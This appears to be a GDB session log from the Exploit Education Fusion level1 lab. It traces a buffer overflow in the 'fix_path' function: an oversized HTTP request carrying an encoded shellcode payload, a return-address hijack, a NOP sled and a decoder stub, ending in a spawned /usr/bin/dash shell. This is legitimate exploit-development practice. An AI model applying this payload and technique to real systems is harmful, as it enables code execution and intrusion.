+   0xffffcafe:	inc    ecx
+   0xffffcaff:	inc    ecx
+   0xffffcb00:	inc    ecx
+   0xffffcb01:	inc    ecx
+   0xffffcb02:	inc    ecx
+   0xffffcb03:	inc    ecx
+   0xffffcb04:	inc    ecx
+   0xffffcb05:	inc    ecx
+   0xffffcb06:	inc    ecx
+   0xffffcb07:	inc    ecx
+   0xffffcb08:	inc    ecx
+   0xffffcb09:	inc    ecx
+   0xffffcb0a:	inc    ecx
+   0xffffcb0b:	inc    ecx
+   0xffffcb0c:	inc    ecx
+   0xffffcb0d:	inc    ecx
+   0xffffcb0e:	inc    ecx
+   0xffffcb0f:	inc    ecx
+   0xffffcb10:	inc    ecx
+   0xffffcb11:	inc    ecx
+   0xffffcb12:	inc    ecx
+   0xffffcb13:	inc    ecx
+   0xffffcb14:	inc    ecx
+   0xffffcb15:	inc    ecx
+   0xffffcb16:	inc    ecx
+   0xffffcb17:	inc    ecx
+   0xffffcb18:	jl     0xffffcadb
+   0xffffcb1a:	pop    es
+   0xffffcb1b:	or     bl,ch
+   0xffffcb1d:	dec    esi
+   0xffffcb1e:	add    BYTE PTR [eax+0x54],cl
+   0xffffcb21:	push   esp
+   0xffffcb22:	push   eax
+   0xffffcb23:	das    
+   0xffffcb24:	xor    DWORD PTR [esi],ebp
+   0xffffcb26:	xor    DWORD PTR [eax],esp
+   0xffffcb28:	nop
+   0xffffcb29:	nop
+   0xffffcb2a:	nop
+   0xffffcb2b:	nop
+   0xffffcb2c:	nop
+   0xffffcb2d:	nop
+   0xffffcb2e:	nop
+   0xffffcb2f:	nop
+   0xffffcb30:	nop
+   0xffffcb31:	nop
+   0xffffcb32:	nop
+   0xffffcb33:	nop
+   0xffffcb34:	nop
+   0xffffcb35:	nop
+   0xffffcb36:	nop
+   0xffffcb37:	nop
+End of assembler dump.
+Undefined command: "exit".  Try "help".
+A syntax error in expression, near `)'.
+Undefined command: "qut".  Try "help".
+Reading symbols from ./target...
+(No debugging symbols found in ./target)
+Reading symbols from ./target...
+(No debugging symbols found in ./target)
+Undefined command: "exit".  Try "help".
+Reading symbols from ./target...
+(No debugging symbols found in ./target)
+Breakpoint 1 at 0x8049ecb
+The program is not being run.
+Starting program: /home/x90slide/exercises/exploit_education/fusion/level1/local/target GET\ /AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAÎN\|¡ÎN\ HTTP/1.1\ êêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêªD—›«Ÿt\$Ù\]1…±1\]É≈ﬂÔËêÒÅ˘¥ú\'w€—AJúÅ‘‰¢hfM§ãé˛jœf˝r–6àí\^–⁄ÕÆÿ,\^\|∫pÚRe†€¿7¿VåŒÊÊ9h
+
+Breakpoint 1, 0x08049ecb in fix_path ()
+Dump of assembler code for function fix_path:
+   0x08049ec7 <+0>:	push   ebp
+   0x08049ec8 <+1>:	mov    ebp,esp
+   0x08049eca <+3>:	push   ebx
+=> 0x08049ecb <+4>:	sub    esp,0x84
+   0x08049ed1 <+10>:	call   0x8049d70 <__x86.get_pc_thunk.bx>
+   0x08049ed6 <+15>:	add    ebx,0xa112a
+   0x08049edc <+21>:	sub    esp,0x8
+   0x08049edf <+24>:	lea    eax,[ebp-0x88]
+   0x08049ee5 <+30>:	push   eax
+   0x08049ee6 <+31>:	push   DWORD PTR [ebp+0x8]
+   0x08049ee9 <+34>:	call   0x8051110 <realpath>
+   0x08049eee <+39>:	add    esp,0x10
+   0x08049ef1 <+42>:	test   eax,eax
+   0x08049ef3 <+44>:	jne    0x8049efc <fix_path+53>
+   0x08049ef5 <+46>:	mov    eax,0x1
+   0x08049efa <+51>:	jmp    0x8049f11 <fix_path+74>
+   0x08049efc <+53>:	sub    esp,0x8
+   0x08049eff <+56>:	lea    eax,[ebp-0x88]
+   0x08049f05 <+62>:	push   eax
+   0x08049f06 <+63>:	push   DWORD PTR [ebp+0x8]
+   0x08049f09 <+66>:	call   0x8049020
+   0x08049f0e <+71>:	add    esp,0x10
+   0x08049f11 <+74>:	mov    ebx,DWORD PTR [ebp-0x4]
+   0x08049f14 <+77>:	leave  
+   0x08049f15 <+78>:	ret    
+End of assembler dump.
+Breakpoint 2 at 0x8049f15
+Continuing.
+
+Breakpoint 2, 0x08049f15 in fix_path ()
+0xffffca6c:	0x0807c17c
+0x0807c17c in _dl_get_tls_static_info ()
+0x0807c17d in _dl_get_tls_static_info ()
+0xffffca70 in ?? ()
+Dump of assembler code from 0xffffca70 to 0xffffca84:
+=> 0xffffca70:	jmp    0xffffcac0
+   0xffffca72:	add    bh,bh
+   0xffffca74:	popa   
+   0xffffca75:	jo     0xffffca82
+   0xffffca77:	or     BYTE PTR [eax],cl
+   0xffffca79:	add    BYTE PTR [eax],al
+   0xffffca7b:	add    BYTE PTR ds:0x8049f,ah
+   0xffffca81:	add    BYTE PTR [eax],al
+   0xffffca83:	add    BYTE PTR [eax],al
+End of assembler dump.
+0xffffcac0 in ?? ()
+Dump of assembler code from 0xffffcac0 to 0xffffcb88:
+=> 0xffffcac0:	inc    ecx
+   0xffffcac1:	inc    ecx
+   0xffffcac2:	inc    ecx
+   0xffffcac3:	inc    ecx
+   0xffffcac4:	inc    ecx
+   0xffffcac5:	inc    ecx
+   0xffffcac6:	inc    ecx
+   0xffffcac7:	inc    ecx
+   0xffffcac8:	inc    ecx
+   0xffffcac9:	inc    ecx
+   0xffffcaca:	inc    ecx
+   0xffffcacb:	inc    ecx
+   0xffffcacc:	inc    ecx
+   0xffffcacd:	inc    ecx
+   0xffffcace:	inc    ecx
+   0xffffcacf:	inc    ecx
+   0xffffcad0:	inc    ecx
+   0xffffcad1:	inc    ecx
+   0xffffcad2:	inc    ecx
+   0xffffcad3:	inc    ecx
+   0xffffcad4:	inc    ecx
+   0xffffcad5:	inc    ecx
+   0xffffcad6:	inc    ecx
+   0xffffcad7:	inc    ecx
+   0xffffcad8:	inc    ecx
+   0xffffcad9:	inc    ecx
+   0xffffcada:	inc    ecx
+   0xffffcadb:	inc    ecx
+   0xffffcadc:	inc    ecx
+   0xffffcadd:	inc    ecx
+   0xffffcade:	inc    ecx
+   0xffffcadf:	inc    ecx
+   0xffffcae0:	inc    ecx
+   0xffffcae1:	inc    ecx
+   0xffffcae2:	inc    ecx
+   0xffffcae3:	inc    ecx
+   0xffffcae4:	inc    ecx
+   0xffffcae5:	inc    ecx
+   0xffffcae6:	inc    ecx
+   0xffffcae7:	inc    ecx
+   0xffffcae8:	inc    ecx
+   0xffffcae9:	inc    ecx
+   0xffffcaea:	inc    ecx
+   0xffffcaeb:	inc    ecx
+   0xffffcaec:	inc    ecx
+   0xffffcaed:	inc    ecx
+   0xffffcaee:	inc    ecx
+   0xffffcaef:	inc    ecx
+   0xffffcaf0:	inc    ecx
+   0xffffcaf1:	inc    ecx
+   0xffffcaf2:	inc    ecx
+   0xffffcaf3:	inc    ecx
+   0xffffcaf4:	inc    ecx
+   0xffffcaf5:	inc    ecx
+   0xffffcaf6:	inc    ecx
+   0xffffcaf7:	inc    ecx
+   0xffffcaf8:	inc    ecx
+   0xffffcaf9:	inc    ecx
+   0xffffcafa:	inc    ecx
+   0xffffcafb:	inc    ecx
+   0xffffcafc:	inc    ecx
+   0xffffcafd:	inc    ecx
+   0xffffcafe:	inc    ecx
+   0xffffcaff:	inc    ecx
+   0xffffcb00:	inc    ecx
+   0xffffcb01:	inc    ecx
+   0xffffcb02:	inc    ecx
+   0xffffcb03:	inc    ecx
+   0xffffcb04:	inc    ecx
+   0xffffcb05:	inc    ecx
+   0xffffcb06:	inc    ecx
+   0xffffcb07:	inc    ecx
+   0xffffcb08:	inc    ecx
+   0xffffcb09:	inc    ecx
+   0xffffcb0a:	inc    ecx
+   0xffffcb0b:	inc    ecx
+   0xffffcb0c:	inc    ecx
+   0xffffcb0d:	inc    ecx
+   0xffffcb0e:	inc    ecx
+   0xffffcb0f:	inc    ecx
+   0xffffcb10:	inc    ecx
+   0xffffcb11:	inc    ecx
+   0xffffcb12:	inc    ecx
+   0xffffcb13:	inc    ecx
+   0xffffcb14:	inc    ecx
+   0xffffcb15:	inc    ecx
+   0xffffcb16:	jmp    0xffffcb66
+   0xffffcb18:	jl     0xffffcadb
+   0xffffcb1a:	pop    es
+   0xffffcb1b:	or     bl,ch
+   0xffffcb1d:	dec    esi
+   0xffffcb1e:	add    BYTE PTR [eax+0x54],cl
+   0xffffcb21:	push   esp
+   0xffffcb22:	push   eax
+   0xffffcb23:	das    
+   0xffffcb24:	xor    DWORD PTR [esi],ebp
+   0xffffcb26:	xor    DWORD PTR [eax],esp
+   0xffffcb28:	nop
+   0xffffcb29:	nop
+   0xffffcb2a:	nop
+   0xffffcb2b:	nop
+   0xffffcb2c:	nop
+   0xffffcb2d:	nop
+   0xffffcb2e:	nop
+   0xffffcb2f:	nop
+   0xffffcb30:	nop
+   0xffffcb31:	nop
+   0xffffcb32:	nop
+   0xffffcb33:	nop
+   0xffffcb34:	nop
+   0xffffcb35:	nop
+   0xffffcb36:	nop
+   0xffffcb37:	nop
+   0xffffcb38:	nop
+   0xffffcb39:	nop
+   0xffffcb3a:	nop
+   0xffffcb3b:	nop
+   0xffffcb3c:	nop
+   0xffffcb3d:	nop
+   0xffffcb3e:	nop
+   0xffffcb3f:	nop
+   0xffffcb40:	nop
+   0xffffcb41:	nop
+   0xffffcb42:	nop
+   0xffffcb43:	nop
+   0xffffcb44:	nop
+   0xffffcb45:	nop
+   0xffffcb46:	nop
+Quit
+Breakpoint 3 at 0xffffcb16
+Continuing.
+
+Breakpoint 3, 0xffffcb16 in ?? ()
+Dump of assembler code from 0xffffcb16 to 0xffffcb20:
+=> 0xffffcb16:	jmp    0xffffcb66
+   0xffffcb18:	jl     0xffffcadb
+   0xffffcb1a:	pop    es
+   0xffffcb1b:	or     bl,ch
+   0xffffcb1d:	dec    esi
+   0xffffcb1e:	add    BYTE PTR [eax+0x54],cl
+End of assembler dump.
+0xffffcb66 in ?? ()
+Dump of assembler code from 0xffffcb66 to 0xffffcbca:
+=> 0xffffcb66:	nop
+   0xffffcb67:	nop
+   0xffffcb68:	nop
+   0xffffcb69:	nop
+   0xffffcb6a:	nop
+   0xffffcb6b:	nop
+   0xffffcb6c:	nop
+   0xffffcb6d:	nop
+   0xffffcb6e:	nop
+   0xffffcb6f:	nop
+   0xffffcb70:	nop
+   0xffffcb71:	nop
+   0xffffcb72:	nop
+   0xffffcb73:	nop
+   0xffffcb74:	nop
+   0xffffcb75:	nop
+   0xffffcb76:	nop
+   0xffffcb77:	nop
+   0xffffcb78:	mov    ebx,0x1d0dd144
+   0xffffcb7d:	ffree  st(7)
+   0xffffcb7f:	fnstenv [esp-0xc]
+   0xffffcb83:	pop    ebp
+   0xffffcb84:	xor    ecx,ecx
+   0xffffcb86:	mov    cl,0x12
+   0xffffcb88:	xor    DWORD PTR [ebp+0x12],ebx
+   0xffffcb8b:	add    ebp,0x4
+   0xffffcb8e:	add    ebx,DWORD PTR [ecx]
+   0xffffcb90:	fucomip st,st(7)
+   0xffffcb92:	call   0xf117d027
+   0xffffcb97:	cmp    ecx,0x77279cb4
+   0xffffcb9d:	fcmovnbe st,st(1)
+   0xffffcb9f:	inc    ecx
+   0xffffcba0:	dec    edx
+   0xffffcba1:	pushf  
+   0xffffcba2:	adc    esp,0x6668a2e4
+   0xffffcba8:	dec    ebp
+   0xffffcba9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
+   0xffffcbaa:	mov    ecx,DWORD PTR [esi]
+   0xffffcbac:	mov    ?,esi
+   0xffffcbae:	push   0xffffffcf
+   0xffffcbb0:	data16 std 
+   0xffffcbb2:	jb     0xffffcb84
+   0xffffcbb4:	mov    BYTE PTR ss:[edx+0x5dad05e],dl
+   0xffffcbbb:	int    0xae
+   0xffffcbbd:	fsubr  DWORD PTR [eax+edx*1]
+   0xffffcbc0:	sbb    eax,0xf0ba7c5e
+   0xffffcbc5:	jo     0xffffcbb9
+   0xffffcbc7:	push   edx
+   0xffffcbc8:	mov    al,gs:0x371cc0db
+End of assembler dump.
+Continuing.
+process 4180 is executing new program: /usr/bin/dash
+Error in re-setting breakpoint 1: Function "fix_path" not defined.
+Warning:
+Cannot insert breakpoint 2.
+Cannot access memory at address 0x8049f15
+Cannot insert breakpoint 3.
+Cannot access memory at address 0xffffcb16
+
